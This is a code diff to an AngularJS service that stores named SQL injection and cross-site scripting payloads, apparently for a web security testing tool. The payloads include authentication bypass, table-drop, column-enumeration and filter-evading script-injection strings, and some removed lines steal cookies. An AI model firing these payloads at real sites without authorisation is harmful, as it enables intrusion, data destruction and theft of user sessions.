@@ -5,20 +5,62 @@ app.service('appConstants', function() {
     const defaultMethod = "GET";
     const methods = ["GET", "POST", "PUT", "PATCH", "DELETE"];
     const sqlInjection = [
-        "; SELECT * FROM members; DROP members--",
-        "/*!32302 10*/",
-        "SELECT /*!32302 1/0, */ 1 FROM tablename"
+        {
+            "name": "Line Comments",
+            "value": `SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'`
+        },
+        {
+            "name": "Inline Comments 1",
+            "value": `DROP/*comment*/sampletable`
+        },
+        {
+            "name": "Inline Comments 2",
+            "value": `SELECT /*!32302 1/0, */ 1 FROM tablename`
+        },
+        {
+            "name": "MySQL Version Detection",
+            "value": `SELECT /*!32302 1/0, */ 1 FROM tablename`
+        },
+        {
+            "name": "Finding Column Names with HAVING BY",
+            "value": `' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --`
+        },
+        {
+            "name": "Finding Column Type",
+            "value": `SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--`
+        },
     ];
     const xss = [
-        `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`,
-        `'';!--"<XSS>=&{()}`,
-        `'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
-        <script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
-        <script>alert(document.cookie)</script>">
-        <img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">
-        <img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">`,
-        '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
-        '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>'
+        {
+            "name": "BODY tag",
+            "value": `<BODY ONLOAD=alert('XSS')>`
+        },
+        {
+            "name": "Escaping JavaScript escapes 1",
+            "value": `\";alert('XSS');//`
+        },
+        {
+            "name": "Escaping JavaScript escapes 2",
+            "value": `</script><script>alert('XSS');</script>`
+        },
+        {
+            "name": "& JavaScript includes",
+            "value": `<BR SIZE="&{alert('XSS')}">`
+        },
+        {
+            "name": "STYLE sheet",
+            "value": `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`
+        },{
+            "name": "STYLE tags with broken up JavaScript for XSS",
+            "value": `<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>`
+        }
+    ];
+
+    const custom = [
+        {
+            "name": "Mike's Special",
+            "value": `super good attack!`
+        }
     ];
 
     this.getMethods = function() {
@@ -35,5 +77,13 @@ app.service('appConstants', function() {
 
     this.getXss = function() {
         return xss;
+    };
+
+    this.getCustom = function() {
+        return custom;
+    };
+
+    this.getAllAttacks = function(){
+        return sqlInjection.concat(xss).concat(custom);
     };
 });
